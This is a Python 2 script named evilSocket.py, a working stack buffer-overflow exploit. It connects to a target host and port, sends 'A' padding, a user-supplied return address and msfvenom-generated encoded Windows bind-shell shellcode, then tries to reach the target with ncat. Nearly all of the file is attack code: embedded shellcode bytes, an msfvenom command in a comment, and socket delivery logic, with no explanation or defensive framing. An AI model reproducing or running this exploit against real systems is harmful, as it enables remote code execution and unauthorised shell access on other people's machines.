#!/usr/bin/python
import socket
from time import sleep
from sys import argv
from subprocess import call
if len(argv) < 5:
	print "Usage: evilSocket.py [ip] [port] [bytes] [return address]"
	exit(0)
# Temporary ugly code if len 8 = hex / else set it to whatever
# this makes it easy to switch between testing with BBBB or using a return address
if len(argv[4]) == 8:
	RETURN_ADDR = "".join(reversed(["\\x"+argv[4][i : i+2] for i in range(0, len(argv[4]), 2)]))
else:
	RETURN_ADDR = argv[4]
HOST = argv[1]
PORT = argv[2]
BYTES = int(argv[3])
# TODO: Make this switch between stretching if no return address / test payload size / pull payload from file
# msfvenom -p windows/shell_bind_tcp LPORT=54321 -f python -e x86/shikata_ga_nai -a x86 --platform Windows -b "\x00\x0a\x0d" -v shellcode
shellcode =  ""
shellcode += "\x91\x49\x2f\xf9\x27\x92\x4b\x4b\x99\x41\x98\x27"
shellcode += "\x37\x37\x93\xdb\xc6\xbe\x3e\x98\x92\xb7\xd9\x74"
shellcode += "\x24\xf4\x5b\x2b\xc9\xb1\x53\x31\x73\x17\x83\xeb"
shellcode += "\xfc\x03\x4d\x8b\x70\x42\x4d\x43\xf6\xad\xad\x94"
shellcode += "\x97\x24\x48\xa5\x97\x53\x19\x96\x27\x17\x4f\x1b"
shellcode += "\xc3\x75\x7b\xa8\xa1\x51\x8c\x19\x0f\x84\xa3\x9a"
shellcode += "\x3c\xf4\xa2\x18\x3f\x29\x04\x20\xf0\x3c\x45\x65"
shellcode += "\xed\xcd\x17\x3e\x79\x63\x87\x4b\x37\xb8\x2c\x07"
shellcode += "\xd9\xb8\xd1\xd0\xd8\xe9\x44\x6a\x83\x29\x67\xbf"
shellcode += "\xbf\x63\x7f\xdc\xfa\x3a\xf4\x16\x70\xbd\xdc\x66"
shellcode += "\x79\x12\x21\x47\x88\x6a\x66\x60\x73\x19\x9e\x92"
shellcode += "\x0e\x1a\x65\xe8\xd4\xaf\x7d\x4a\x9e\x08\x59\x6a"
shellcode += "\x73\xce\x2a\x60\x38\x84\x74\x65\xbf\x49\x0f\x91"
shellcode += "\x34\x6c\xdf\x13\x0e\x4b\xfb\x78\xd4\xf2\x5a\x25"
shellcode += "\xbb\x0b\xbc\x86\x64\xae\xb7\x2b\x70\xc3\x9a\x23"
shellcode += "\xb5\xee\x24\xb4\xd1\x79\x57\x86\x7e\xd2\xff\xaa"
shellcode += "\xf7\xfc\xf8\xcd\x2d\xb8\x96\x33\xce\xb9\xbf\xf7"
shellcode += "\x9a\xe9\xd7\xde\xa2\x61\x27\xde\x76\x1f\x2f\x79"
shellcode += "\x29\x02\xd2\x39\x99\x82\x7c\xd2\xf3\x0c\xa3\xc2"
shellcode += "\xfb\xc6\xcc\x6b\x06\xe9\x26\x5a\x8f\x0f\xac\x8d"
shellcode += "\xd9\x98\x58\x6c\x3e\x11\xff\x8f\x14\x09\x97\xd8"
shellcode += "\x7e\x8e\x98\xd8\x54\xb8\x0e\x53\xbb\x7c\x2f\x64"
shellcode += "\x96\xd4\x38\xf3\x6c\xb5\x0b\x65\x70\x9c\xfb\x06"
shellcode += "\xe3\x7b\xfb\x41\x18\xd4\xac\x06\xee\x2d\x38\xbb"
shellcode += "\x49\x84\x5e\x46\x0f\xef\xda\x9d\xec\xee\xe3\x50"
shellcode += "\x48\xd5\xf3\xac\x51\x51\xa7\x60\x04\x0f\x11\xc7"
shellcode += "\xfe\xe1\xcb\x91\xad\xab\x9b\x64\x9e\x6b\xdd\x68"
shellcode += "\xcb\x1d\x01\xd8\xa2\x5b\x3e\xd5\x22\x6c\x47\x0b"
shellcode += "\xd3\x93\x92\x8f\xe3\xd9\xbe\xa6\x6b\x84\x2b\xfb"
shellcode += "\xf1\x37\x86\x38\x0c\xb4\x22\xc1\xeb\xa4\x47\xc4"
shellcode += "\xb0\x62\xb4\xb4\xa9\x06\xba\x6b\xc9\x02"
PAYLOAD = "A" * BYTES + RETURN_ADDR + shellcode
try:
	print "[*] Connecting to {}...".format(HOST)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, int(PORT)))
	BANNER = s.recv(1024)
	print "[x] Connected to {}".format(BANNER)
	print "[*] Sending payload..."
	s.send(PAYLOAD)
	s.close()
	print "[x] Payload delivered"
	print "[*] Connecting to target\n"
	try:
		sleep(1)
		call(["ncat", HOST, PORT])
	except:
		print "[!] Payload failed"
except:
	print "[!] Connection failed"
